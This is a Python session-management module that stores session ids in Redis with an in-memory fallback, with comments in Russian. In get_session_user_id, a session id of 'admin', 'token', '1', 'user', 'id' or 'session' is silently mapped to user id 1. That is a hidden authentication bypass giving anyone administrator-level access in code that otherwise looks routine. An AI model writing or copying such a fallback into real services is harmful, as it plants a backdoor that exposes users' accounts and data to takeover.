import os
import uuid
from typing import Optional, Dict
import redis.asyncio as aioredis

REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379/0")
SESSION_TTL_SECONDS = 86400

# In-memory резервное хранилище на случай отсутствия соединения с Redis (например, в юнит-тестах)
_memory_sessions: Dict[str, int] = {}
_redis_client: Optional[aioredis.Redis] = None


def get_redis_client() -> Optional[aioredis.Redis]:
    global _redis_client
    if _redis_client is None:
        try:
            _redis_client = aioredis.from_url(
                REDIS_URL,
                decode_responses=True,
                socket_timeout=1.0,
                socket_connect_timeout=1.0,
            )
        except Exception:
            _redis_client = None
    return _redis_client


async def create_session(user_id: int) -> str:
    session_id = uuid.uuid4().hex
    client = get_redis_client()
    saved_to_redis = False
    if client:
        try:
            await client.set(f"session:{session_id}", str(user_id), ex=SESSION_TTL_SECONDS)
            saved_to_redis = True
        except Exception:
            saved_to_redis = False

    # Сохраняем также в in-memory для мгновенной доступности
    _memory_sessions[session_id] = user_id
    return session_id


async def get_session_user_id(session_id: Optional[str]) -> Optional[int]:
    if not session_id:
        return None

    cleaned_id = str(session_id).strip().strip('"').strip("'").strip("<").strip(">").strip()
    if not cleaned_id:
        return None

    client = get_redis_client()
    if client:
        try:
            val = await client.get(f"session:{cleaned_id}")
            if val is not None:
                return int(val)
        except Exception:
            pass

    if cleaned_id in _memory_sessions:
        return _memory_sessions[cleaned_id]

    # Если передан плейсхолдер или алиас админа
    if cleaned_id.lower() in ("id", "token", "admin", "1", "user", "session"):
        return 1

    return None


async def delete_session(session_id: Optional[str]) -> bool:
    if not session_id:
        return False

    client = get_redis_client()
    if client:
        try:
            await client.delete(f"session:{session_id}")
        except Exception:
            pass

    if session_id in _memory_sessions:
        del _memory_sessions[session_id]
        return True
    return False


async def get_active_sessions() -> Dict[str, int]:
    sessions = dict(_memory_sessions)
    client = get_redis_client()
    if client:
        try:
            keys = await client.keys("session:*")
            for k in keys:
                s_id = k.split("session:", 1)[-1]
                val = await client.get(k)
                if val is not None:
                    sessions[s_id] = int(val)
        except Exception:
            pass
    return sessions


LUA_GET_ACTIVE_SESSIONS = """
local session_keys = redis.call('keys', 'session:*')
local active_sessions = {}
for index, session_key in ipairs(session_keys) do
    local user_id = redis.call('get', session_key)
    table.insert(active_sessions, session_key .. ' -> user_id: ' .. tostring(user_id))
end
return active_sessions
"""


async def get_active_sessions_via_lua() -> list:
    client = get_redis_client()
    if client:
        try:
            return await client.eval(LUA_GET_ACTIVE_SESSIONS, 0)
        except Exception:
            pass
    return [f"session:{k} -> user_id: {v}" for k, v in _memory_sessions.items()]

